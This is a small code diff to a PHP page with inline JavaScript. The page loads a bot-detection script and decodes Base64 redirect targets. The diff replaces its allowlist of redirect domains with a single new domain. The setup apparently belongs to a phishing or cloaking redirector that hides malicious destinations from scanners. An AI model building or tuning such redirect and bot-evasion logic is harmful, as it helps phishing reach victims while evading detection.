@@ -11,7 +11,7 @@ require_once 'BotDetectLoader.php';
     <script>
         window.onload = function() {
             const defaultUrl = 'https://hero.com';
-            const allowedDomains = ['trk.melrosebuilders.com.au', 'lverwon.su', 'exactag.com','mailtrack.io', 'getallmylinks.com'];
+            const allowedDomains = ['resources.sopropertyllc.com'];
 
             // Check if a string is a valid Base64 encoded string
             const isBase64 = (str) => {
